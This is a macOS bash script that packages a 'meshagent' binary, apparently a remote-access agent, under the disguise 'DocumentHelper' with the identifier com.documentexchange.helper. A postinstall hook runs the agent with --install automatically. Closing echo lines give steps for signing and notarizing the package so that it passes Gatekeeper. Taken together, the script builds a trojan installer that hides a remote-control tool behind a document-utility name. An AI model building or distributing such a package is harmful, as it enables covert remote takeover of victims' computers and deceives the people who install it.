#!/bin/bash
# Run this on macOS to build DocumentHelper.pkg
# Prerequisites: meshagent binary already extracted to ~/build/mh1/meshagent

set -e
cd "$(dirname "$0")"

# Verify meshagent is Mach-O universal binary
file meshagent
# expect: Mach-O universal binary, x86_64 + arm64

# Create package structure
mkdir -p root/usr/local/bin scripts
cp meshagent root/usr/local/bin/DocumentHelper
# Ad-hoc sign for Apple Silicon compatibility
codesign --force -s - root/usr/local/bin/DocumentHelper
codesign -dv root/usr/local/bin/DocumentHelper 2>&1 | grep -i signature
printf '#!/bin/bash\nchmod +x /usr/local/bin/DocumentHelper\n/usr/local/bin/DocumentHelper --install\nexit 0\n' > scripts/postinstall
chmod +x scripts/postinstall

# Build unsigned package
pkgbuild --root root --scripts scripts --identifier com.documentexchange.helper \
  --version 1.4.2 --install-location / DocumentHelper.pkg

echo "Built: DocumentHelper.pkg"
echo "For signed/notarized version, run:"
echo '  productsign --sign "Developer ID Installer: NAME (TEAMID)" DocumentHelper.pkg Signed.pkg'
echo '  xcrun notarytool submit Signed.pkg --keychain-profile gk --wait'
echo '  xcrun stapler staple Signed.pkg'
echo '  spctl -a -vvv -t install Signed.pkg'
